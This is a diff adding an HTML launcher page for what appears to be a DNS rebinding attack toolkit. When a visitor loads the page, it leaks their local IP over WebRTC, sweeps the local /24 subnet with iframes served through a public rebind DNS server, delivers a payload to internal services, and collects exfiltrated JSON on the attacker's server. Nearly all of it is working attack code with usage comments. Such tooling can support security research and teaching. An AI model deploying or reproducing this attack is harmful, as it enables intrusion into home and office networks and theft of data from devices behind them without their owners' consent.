@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<head>
+	<title>Example launcher</title>
+</head>
+<body>
+    <p>Open your developer's console to see what's happening.</p>
+    <!-- This script is a depency of DNSRebindAttack.js and must be included -->
+    <script type="text/javascript" src="/share/js/EventEmitter.js"></script>
+    <script type="text/javascript" src="/share/js/DNSRebindAttack.js"></script>
+    <script type="text/javascript">
+
+    // DNSRebindAttack has a static method that uses WebRTC to leak the
+    // browser's IP address on the LAN. We'll use this to guess the LAN's IP
+    // subnet. If the local IP is 192.168.1.89, we'll launch 255 iframes
+    // targetting all IP addresses from 192.168.1.1-255
+    DNSRebindAttack.getLocalIPAddress()
+    .then(ip => launchRebindAttack(ip))
+    .catch(err => {
+        console.error(err)
+        // Looks like our nifty WebRTC leak trick didn't work (doesn't work
+        // in Firefox). No biggie, most home networks are 192.168.1.1/24 anyway.
+        launchRebindAttack('192.168.1.1')
+    })
+
+    function launchRebindAttack(localIp) {
+
+        // convert 192.168.1.1 into array from 192.168.1.0 - 192.168.1.255
+        const first3Octets = localIp.substring(0, localIp.lastIndexOf('.'))
+        const ips = [...Array(256).keys()].map(octet => `${first3Octets}.${octet}`)
+
+        // The first argument is the domain name of a publicly accessible
+        // whonow server (https://github.com/brannondorsey/whonow).
+        // I've got one running on port 53 of rebind.network you can to use.
+        // Chances are the services you are attacking aren't running on port
+        // 80, so you might want to change that.
+        const rebind = new DNSRebindAttack('rebind.network', 3000)
+
+        // Launch a DNS Rebind attack, spawing 255 iframes attacking the service
+        // on each host of the subnet (or so we hope).
+        // Args are:
+        //  1) target ip addresses
+        //  2) IP address your Node server.js is running on. Usually 127.0.0.1
+        //     during dev, but then the publicly accessible IP (not hostname)
+        //     of the VPS hosting this repo in production.
+        //  3) the HTML payload to deliver to this service. This HTML file should
+        //     have a DNSRebindNode instance implemented on in it.
+        //  4) the interval in milliseconds to wait between each new iframe
+        //     embed. Spawning 100 iframes at the same time can choke (or crash)
+        //     a browser. The higher this value, the longer the attack takes,
+        //     but the less resources it consumes.
+        rebind.attack(ips, '127.0.0.1', 'examples/payload.html', 200)
+
+        // you can listen for three events on the rebind object:
+        //  - iframe-added: called each time a new iframe is added to the page.
+        //  - iframe-removed: called each time an iframe is removed from the page
+        //    using a DNSRebindNode.emit('end') event.
+        //  - all-iframes-added: called once all iframes have been added. This
+        //    doesn't mean all iframe's attacks have finished, only that they
+        //    have all started.
+
+        // fires each time a new iframe is added to the DOM
+        rebind.on('iframe-added', (ip, src) => {
+            // ip -> 192.168.1.103
+            // src -> a.127.0.0.1.1time.192.168.1.103.forever.rebind.network/examples/payload.html
+        })
+
+        // fires once all iframes have been added to the DOM
+        rebind.on('all-iframes-added', () => {
+
+        })
+
+        // fires when an iframe is removed. This occurs when DNSRebindNode
+        // emits the ('end')
+        rebind.on('iframe-removed', (ip, src) => {
+            // same params as iframes-added
+        })
+
+        // rebind.nodes is also an EventEmitter, only this one is fired using
+        // DNSRebindNode.emit(...). This allows DNSRebindNodes inside of
+        // iframes to post messages back to the parent DNSRebindAttack that
+        // launched them. You can define custome events by simply emitting
+        // DNSRebindNode.emit('my-custom-event') and a listener in rebind.nodes
+        // can receive it. That said, there are a few standard event names that
+        // get triggered automagically:
+        //  - begin: triggered when DNSRebindNode.js is loaded. This signifies
+        //    that an attack has been launched (or at least, it's payload was
+        //    delivered) against an IP address.
+        //  - rebind: the DNS rebind was successful, this node should now be
+        //    communicating with the target service.
+        //  - exfiltrate: send JSON data back to your Node server.js and save
+        //    it inside the data/ folder.
+        // Additionally, the DNSRebindNode.destroy() static method
+        // will trigger the 'destory' event and cause DNSRebindAttack to
+        // remove the iframe.
+
+        rebind.nodes.on('begin', (ip) => {
+            // the DNSRebindNode has been loaded, attacking ip
+        })
+
+        rebind.nodes.on('rebind', (ip) => {
+            // the rebind was successful
+            console.log('node rebind', ip)
+        })
+
+        rebind.nodes.on('exfiltrate', (ip, data) => {
+            // JSON data was exfiltrated and saved to the data/
+            // folder on the remote machine hosting server.js
+            console.log('node exfiltrate', ip, data)
+        })
+
+        rebind.nodes.on('destroy', (ip) => {
+            // this event is triggered by DNSRebindNode.destroy().
+            // Immediately after this event is fired, the DNSRebindAttack
+            // instance removes this ip's iframe from the page and the
+            // attack against that host is finished.
+        })
+
+        // you can add your own custom events too! Simply fire them using
+        // DNSRebindNode.emit('my-custom-event') and subscribe to them like so.
+        rebind.nodes.on('my-custom-event', (ip, data) => {
+
+        })
+    }
+
+    </script>
+</body>
+</html>
